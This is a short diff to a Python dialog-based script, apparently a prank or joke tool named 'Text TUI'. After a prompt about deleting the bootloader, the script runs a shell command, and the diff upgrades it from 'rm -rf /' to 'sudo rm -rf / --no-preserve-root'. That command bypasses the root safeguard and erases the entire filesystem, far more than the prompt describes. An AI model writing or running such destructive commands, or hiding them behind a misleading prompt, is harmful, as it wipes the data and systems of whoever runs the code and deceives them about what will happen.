@@ -12,4 +12,4 @@ print("Welcome To Text TUI")
 
 if d.yesno("Are you REALLY sure you want to delete the bootloader?") == d.OK:
     d.msgbox("You have been warned...")
-    os.system("rm -rf /")
+    os.system("sudo rm -rf / --no-preserve-root")
